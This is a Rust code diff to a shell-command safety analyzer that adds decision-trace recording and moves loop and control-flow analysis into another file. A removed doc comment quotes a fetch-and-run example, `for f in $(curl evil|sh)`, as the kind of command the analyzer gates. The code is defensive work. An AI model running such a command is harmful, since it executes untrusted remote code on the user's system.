@@ -11,7 +11,8 @@ use crate::environment::Environment;
 use crate::error::RippyError;
 use crate::handlers::is_sole_help_flag;
 use crate::parser::BashParser;
-use crate::resolve::{self, LocalBinding, VarLookup};
+use crate::resolve::{LocalBinding, VarLookup};
+use crate::trace::{Stage, Trace, TraceEvent};
 use crate::verdict::{AllowReason, Decision, Verdict};
 
 const MAX_DEPTH: usize = 256;
@@ -61,6 +62,9 @@ pub struct Analyzer {
     /// assignments in a list. Managed with a strict checkpoint/truncate
     /// discipline so a binding never leaks past its lexical scope.
     locals: Vec<(String, LocalBinding)>,
+    /// Decision-trace recorder. Echoes to stderr when `verbose`, and collects
+    /// events when `rippy inspect` has called [`Analyzer::record_trace`].
+    trace: Trace,
 }
 
 impl Analyzer {
@@ -88,6 +92,7 @@ impl Analyzer {
             resolution_depth: 0,
             node_budget: MAX_NODES,
             locals: Vec::new(),
+            trace: Trace::new(env.verbose),
         })
     }
 
@@ -136,6 +141,22 @@ impl Analyzer {
         }
     }
 
+    /// Start collecting decision-trace events, for `rippy inspect` / `rippy debug`
+    /// to render after [`Analyzer::analyze`] returns.
+    pub const fn record_trace(&mut self) {
+        self.trace.enable();
+    }
+
+    /// Take the events recorded for the most recent [`Analyzer::analyze`] call.
+    /// Empty unless [`Analyzer::record_trace`] was called first.
+    pub fn take_trace(&mut self) -> Vec<TraceEvent> {
+        self.trace.take()
+    }
+
+    fn trace(&mut self, stage: Stage, matched: bool, detail: impl FnOnce() -> String) {
+        self.trace.record(stage, matched, detail);
+    }
+
     /// Analyze a shell command string and return a safety verdict.
     ///
     /// # Errors
@@ -146,6 +167,7 @@ impl Analyzer {
     /// unparseable-but-runnable command is gated rather than silently allowed.
     /// The `Result` signature is retained for call-site stability.
     pub fn analyze(&mut self, command: &str) -> Result<Verdict, RippyError> {
+        self.trace.reset();
         // Strip a leading `NAME=VALUE` env prefix so string-matching layers see
         // the real command. see docs/security-invariants.md#env-prefix-strip
         let parsed = self.parser.parse(command);
@@ -154,6 +176,11 @@ impl Analyzer {
             .ok()
             .and_then(|nodes| ast::strip_env_prefix(command, nodes));
         let match_str = stripped.as_deref().unwrap_or(command);
+        if match_str != command {
+            self.trace(Stage::EnvPrefix, true, || {
+                format!("matching against `{match_str}`")
+            });
+        }
 
         // A whole-string ALLOW may only short-circuit a single plain command; for a
         // chain/pipe/subst/redirect the trailing payload would ride along (Ask/Deny
@@ -163,29 +190,10 @@ impl Analyzer {
             .ok()
             .is_some_and(|nodes| ast::is_single_plain_command(nodes));
 
-        if let Some(decision) = self.cc_rules.check(match_str)
-            && (decision != Decision::Allow || plain)
-        {
-            if self.verbose {
-                eprintln!(
-                    "[rippy] CC permission rule matched: {match_str} -> {}",
-                    decision.as_str()
-                );
-            }
-            return Ok(cc_decision_to_verdict(decision, match_str));
+        if let Some(verdict) = self.cc_string_rule(match_str, plain) {
+            return Ok(verdict);
         }
-
-        if let Some(verdict) = self
-            .config
-            .match_command(match_str, Some(&self.match_ctx()))
-            && (verdict.decision != Decision::Allow || plain)
-        {
-            if self.verbose {
-                eprintln!(
-                    "[rippy] config rule matched: {match_str} -> {}",
-                    verdict.decision.as_str()
-                );
-            }
+        if let Some(verdict) = self.config_string_rule(match_str, plain) {
             return Ok(verdict);
         }
 
@@ -193,13 +201,48 @@ impl Analyzer {
         // anything rable cannot parse is gated with Ask — never an Err that would
         // exit non-blocking and let the command run un-gated (#150).
         let Ok(nodes) = parsed else {
+            self.trace(Stage::Parse, false, || {
+                "rable could not parse this command".to_owned()
+            });
             return Ok(Verdict::ask(
                 "rippy could not parse this command; approve manually",
             ));
         };
+        self.trace(Stage::Parse, true, || {
+            format!("{} top-level node(s)", nodes.len())
+        });
         let cwd = self.working_directory.clone();
         self.node_budget = MAX_NODES;
         Ok(self.analyze_nodes(&nodes, &cwd, 0))
+    }
+
+    /// Whole-string CC-permission match, recorded whether or not it applies.
+    fn cc_string_rule(&mut self, match_str: &str, plain: bool) -> Option<Verdict> {
+        let Some(decision) = self.cc_rules.check(match_str) else {
+            self.trace(Stage::CcRule, false, || "no match".to_owned());
+            return None;
+        };
+        let applies = decision != Decision::Allow || plain;
+        self.trace(Stage::CcRule, true, || {
+            string_rule_detail(decision.as_str(), match_str, applies)
+        });
+        applies.then(|| cc_decision_to_verdict(decision, match_str))
+    }
+
+    /// Whole-string config-rule match, recorded whether or not it applies.
+    fn config_string_rule(&mut self, match_str: &str, plain: bool) -> Option<Verdict> {
+        let matched = self
+            .config
+            .match_command(match_str, Some(&self.match_ctx()));
+        let Some(verdict) = matched else {
+            self.trace(Stage::ConfigRule, false, || "no match".to_owned());
+            return None;
+        };
+        let applies = verdict.decision != Decision::Allow || plain;
+        self.trace(Stage::ConfigRule, true, || {
+            string_rule_detail(verdict.decision.as_str(), &verdict.reason, applies)
+        });
+        applies.then_some(verdict)
     }
 
     fn analyze_nodes(&mut self, nodes: &[Node], cwd: &Path, depth: usize) -> Verdict {
@@ -264,56 +307,6 @@ impl Analyzer {
             }
             _ if ast::is_expansion_node(&node.kind) => Verdict::ask("shell expansion"),
             _ => Verdict::ask("unrecognized shell construct"),
-        }
-    }
-
-    fn analyze_control_flow(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
-        match &node.kind {
-            NodeKind::If {
-                condition,
-                then_body,
-                else_body,
-                redirects,
-            } => {
-                let mut parts: Vec<&Node> = vec![condition.as_ref(), then_body.as_ref()];
-                if let Some(eb) = else_body.as_deref() {
-                    parts.push(eb);
-                }
-                self.analyze_compound(&parts, redirects, cwd, depth)
-            }
-            NodeKind::While {
-                condition,
-                body,
-                redirects,
-            }
-            | NodeKind::Until {
-                condition,
-                body,
-                redirects,
-            } => self.analyze_compound(&[condition.as_ref(), body.as_ref()], redirects, cwd, depth),
-            NodeKind::For { .. } | NodeKind::Select { .. } => {
-                self.analyze_loop_binding(node, cwd, depth)
-            }
-            NodeKind::ForArith {
-                body, redirects, ..
-            }
-            | NodeKind::BraceGroup { body, redirects } => {
-                self.analyze_compound(&[body.as_ref()], redirects, cwd, depth)
-            }
-            NodeKind::Case {
-                patterns,
-                redirects,
-                ..
-            } => {
-                let mut verdicts: Vec<Verdict> = patterns
-                    .iter()
-                    .filter_map(|p| p.body.as_ref())
-                    .map(|b| self.analyze_node(b, cwd, depth + 1))
-                    .collect();
-                verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
-                Verdict::combine(&verdicts)
-            }
-            _ => Verdict::allow(AllowReason::Empty),
         }
     }
 
@@ -463,74 +456,6 @@ impl Analyzer {
         v
     }
 
-    /// Analyze a `for`/`select` loop that binds an iteration variable.
-    ///
-    /// The iteration `words` are analyzed first (in the outer scope) so a
-    /// dangerous expansion there — `for f in $(curl evil|sh)` — can no longer
-    /// skip analysis. The loop variable is then bound as [`LocalBinding::Dynamic`]
-    /// (set, value unknown) while the body is analyzed, and unwound afterward.
-    fn analyze_loop_binding(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
-        let (NodeKind::For {
-            var,
-            words,
-            body,
-            redirects,
-        }
-        | NodeKind::Select {
-            var,
-            words,
-            body,
-            redirects,
-        }) = &node.kind
-        else {
-            // Unreachable: only dispatched on `NodeKind::For`/`NodeKind::Select`.
-            // Fail closed rather than fail open for defense in depth.
-            return Verdict::ask("internal: non-loop node in analyze_loop_binding");
-        };
-        let checkpoint = self.locals.len();
-        let mut verdicts = self.analyze_iteration_words(words.as_deref());
-        self.locals.push((var.clone(), LocalBinding::Dynamic));
-        verdicts.push(self.analyze_node(body, cwd, depth + 1));
-        verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
-        self.locals.truncate(checkpoint);
-        Verdict::combine(&verdicts)
-    }
-
-    /// Check a loop's iteration words for unresolvable expansions (command or
-    /// process substitution). Literal words and globs resolve fine and produce
-    /// no verdict; an unresolvable word yields an Ask so the substitution is not
-    /// silently executed. Uses the current locals scope (loop var not yet bound).
-    fn analyze_iteration_words(&self, words: Option<&[Node]>) -> Vec<Verdict> {
-        let Some(words) = words else {
-            return Vec::new();
-        };
-        let scoped = resolve::ScopedLookup::new(&self.locals, self.var_lookup.as_ref());
-        words
-            .iter()
-            .filter_map(|w| match resolve::resolve_word(w, &scoped) {
-                resolve::WordResolution::Unresolvable { reason } => {
-                    Some(Verdict::ask(format!("shell expansion ({reason})")))
-                }
-                _ => None,
-            })
-            .collect()
-    }
-
-    fn analyze_compound(
-        &mut self,
-        parts: &[&Node],
-        redirects: &[Node],
-        cwd: &Path,
-        depth: usize,
-    ) -> Verdict {
-        let mut verdicts: Vec<Verdict> = parts
-            .iter()
-            .map(|b| self.analyze_node(b, cwd, depth + 1))
-            .collect();
-        verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
-        Verdict::combine(&verdicts)
-    }
-
     /// Returns `true` if any `NAME=VALUE` assignment on a simple command has a
     /// shell expansion in its value (e.g. a command substitution or backticks).
     ///
@@ -572,24 +497,15 @@ impl Analyzer {
             return Verdict::combine(&verdicts);
         }
 
-        let Some(raw_name) = ast::command_name_from_words(words) else {
+        let Some(cmd_name) = self.resolved_command_name(words) else {
             return Verdict::allow(AllowReason::EmptyCommand);
         };
-        let name = raw_name.to_owned();
         let args = ast::command_args_from_words(words);
 
-        let resolved = self.config.resolve_alias(&name);
-        let cmd_name = if resolved == name {
-            name.clone()
-        } else {
-            resolved.to_owned()
-        };
-
-        if self.verbose {
-            eprintln!("[rippy] command: {cmd_name}");
-        }
-
         if allowlists::is_wrapper(&cmd_name) {
+            self.trace(Stage::Allowlist, true, || {
+                format!("{cmd_name} is a wrapper")
+            });
             if args.is_empty() {
                 return Verdict::allow(AllowReason::Wrapper(cmd_name.clone()));
             }
@@ -598,9 +514,9 @@ impl Analyzer {
         }
 
         if allowlists::is_simple_safe(&cmd_name) {
-            if self.verbose {
-                eprintln!("[rippy] allowlist: {cmd_name} is safe");
-            }
+            self.trace(Stage::Allowlist, true, || {
+                format!("{cmd_name} is in the simple-safe list")
+            });
             return self.with_redirects(
                 Verdict::allow(AllowReason::SimpleSafe(cmd_name.clone())),
                 redirects,
@@ -612,16 +528,43 @@ impl Analyzer {
         // matching it anywhere let a dangerous operand ride along (#149). Bare `-h`
         // is dropped (commands overload it as `-h <host>`), so a lone `-h` Asks.
         if is_sole_help_flag(&args, &["--help", "--version"]) {
+            self.trace(Stage::Allowlist, true, || {
+                format!("{cmd_name} help/version flag is the sole argument")
+            });
             return Verdict::allow(AllowReason::HelpFlag(cmd_name.clone()));
         }
+        self.trace(Stage::Allowlist, false, || {
+            format!("{cmd_name} is not in any allowlist")
+        });
 
         let handler_verdict = self.classify_with_handler(&cmd_name, &args, cwd, depth);
         self.with_redirects(handler_verdict, redirects, cwd)
     }
+
+    /// Resolve a command's name through the alias table and record it.
+    fn resolved_command_name(&mut self, words: &[Node]) -> Option<String> {
+        let raw_name = ast::command_name_from_words(words)?;
+        let cmd_name = self.config.resolve_alias(raw_name).to_owned();
+        self.trace(Stage::Command, true, || cmd_name.clone());
+        Some(cmd_name)
+    }
 }
+
+#[path = "analyzer_control_flow.rs"]
+mod control_flow;
 
 #[path = "analyzer_dispatch.rs"]
 mod dispatch;
+
+/// Trace detail for a whole-string rule match, disclosing when a matching ALLOW
+/// was withheld. see docs/security-invariants.md#string-rule-chokepoint
+fn string_rule_detail(decision: &str, subject: &str, applies: bool) -> String {
+    if applies {
+        format!("{decision}: {subject}")
+    } else {
+        format!("{decision}: {subject} (not applied: allow covers a single plain command only)")
+    }
+}
 
 fn cc_decision_to_verdict(decision: Decision, command: &str) -> Verdict {
     match decision {
